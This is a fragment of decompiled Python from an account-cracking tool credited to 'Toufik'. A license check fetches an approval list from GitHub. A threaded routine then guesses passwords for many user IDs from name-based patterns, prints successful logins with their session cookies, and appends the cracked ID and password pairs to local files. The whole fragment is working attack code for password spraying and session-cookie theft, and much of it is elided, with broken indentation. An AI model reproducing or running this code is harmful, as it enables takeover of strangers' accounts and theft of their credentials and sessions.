# Decompile by Mardis (Tools By Toufik-9X4)
...
def approval():
  ...
  id = "-".join(uuid)
  try:
    httpCaht = requests.get('https://raw.githubusercontent.com/testourx/T-X/main/Again.txt').text
    if id in httpCaht:
...
def mail():
	...
	with ThreadPool(max_workers=30) as saimon:
		...
		for nm in user:
			...
			pwx = [first,first+last,'@@'+first+'123','@@'+first+'##','@@'+first+'1122',first+'1234',first+'11##',first+'11','@@'+first+'12345',first+'12345']
			saimon.submit(c,uid,pwx,ln)
	print(50*'_')
	print(' [π] Crack process has been completed')
	print(50*'_')
        ...
        for ps in pwx:
         ...
         #   log_cookies=session.cookies.get_dict().keys()
            ...
            #	botok(uid,ps)
            	...
            	cid = coki[65:80]
            	print('\033[1;92mTOUFIK-OK[😁]\033[1;92m] \033[1;92m' +cid+ ' | ' +ps+    ' |>>'+tahunng(cid))
            	print('\033[1;92m[\033[1;92m🍪\033[1;92m]COOKIES : \033[1;92m'+coki+ '')
            	open('TOUFIK-OK.txt', 'a').write( cid+' | '+ps+'\n')
            	...
            	coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
            	cid = coki[82:97]
            	print('\33[1;30m(TOUFIK-Cp [💔] '+cid+ ' | ' +ps+'  |>>'+tahunng(cid))
            	#print('\033[1;92m[\033[1;92mðŸª\033[1;92m]COOKIES : \033[1;92m'+coki+ '')
            	open('TOUFIK-CP.txt', 'a').write( uid+' | '+ps+' \n')
            	cps.append(cid)
            	break
            else:
            	#print (random_header())
